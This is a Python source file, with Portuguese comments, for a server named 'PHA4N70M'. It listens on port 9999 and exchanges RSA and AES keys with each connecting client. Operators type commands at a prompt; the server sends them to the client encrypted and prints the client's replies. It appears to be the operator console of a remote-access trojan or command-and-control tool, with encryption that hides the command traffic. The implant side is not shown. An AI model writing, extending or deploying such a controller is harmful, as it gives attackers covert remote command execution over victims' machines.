import socket
import threading
import json
import time
import os
from colorama import init, Fore, Style
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Inicializa o colorama
init(autoreset=True)

# Gerar chave RSA (criptografia assimétrica)
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Serializar chave pública para enviar ao cliente
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Função para descriptografar com RSA
def rsa_decrypt(ciphertext):
    return private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

# Função para criptografia AES
def encrypt_aes(key, message):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(message.encode())

# Função para descriptografia AES
def decrypt_aes(key, ciphertext):
    iv = ciphertext[:16]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext[16:]).decode()

# Função de autenticação com RSA
def authenticate(client_socket):
    # Enviar chave pública para o cliente
    client_socket.send(public_key_pem)

    # Receber chave AES criptografada com RSA
    encrypted_aes_key = client_socket.recv(256)
    aes_key = rsa_decrypt(encrypted_aes_key)

    return aes_key

# Função para lidar com cada cliente
def handle_client(client_socket, addr):
    print(Fore.GREEN + f"Conexão recebida de {addr}")
    
    # Autenticação RSA e troca de chave AES
    aes_key = authenticate(client_socket)
    print(Fore.BLUE + "Autenticação concluída.")

    while True:
        try:
            # Receber comando do PHA4N70M e criptografar com AES
            command = input(Fore.YELLOW + "PHA4N70M> ")
            encrypted_command = encrypt_aes(aes_key, command)
            client_socket.send(encrypted_command)

            if command.lower() == 'exit':
                break

            # Receber resposta do cliente
            response = client_socket.recv(4096)
            decrypted_response = decrypt_aes(aes_key, response)
            print(Fore.CYAN + f"Resposta do cliente {addr}: {decrypted_response}")

        except Exception as e:
            print(Fore.RED + f"Erro com cliente {addr}: {e}")
            break

    client_socket.close()

# Função principal do servidor
def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))  # Porta principal do servidor PHA4N70M
    server.listen(5)
    print(Fore.MAGENTA + "PHA4N70M ouvindo na porta 9999...")

    while True:
        client_socket, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    main()
